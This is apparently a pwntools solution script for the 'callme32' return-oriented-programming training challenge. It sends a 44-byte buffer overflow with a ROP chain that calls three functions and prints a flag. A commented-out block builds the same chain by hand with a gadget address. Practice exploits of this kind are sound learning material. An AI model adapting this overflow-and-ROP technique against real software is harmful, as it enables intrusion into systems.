from pwn import *

e = ELF('./callme32')

rop = ROP(e)

rop.callme_one(1,2,3)
rop.callme_two(1,2,3)
rop.callme_three(1,2,3)

r = process(e.path)

r.recvuntil('>')

r.send('A'*44 + str(rop))

r.recv()

r.send("\n")

log.success("Flag: " + r.recv())

'''
pop3ret = 0x080488a9

payload = "A"*44
payload += p32(callme1)
payload += p32(pop3ret)
payload += p32(1)
payload += p32(2)
payload += p32(3)
payload += p32(callme2)
payload += p32(pop3ret)
payload += p32(1)
payload += p32(2)
payload += p32(3)
payload += p32(callme3)
payload += p32(pop3ret)
payload += p32(1)
payload += p32(2)
payload += p32(3)

r = process('./callme32')

r.recvuntil('> ')
r.sendline(payload)

r.recvall()
log.success(r.recvall)
'''
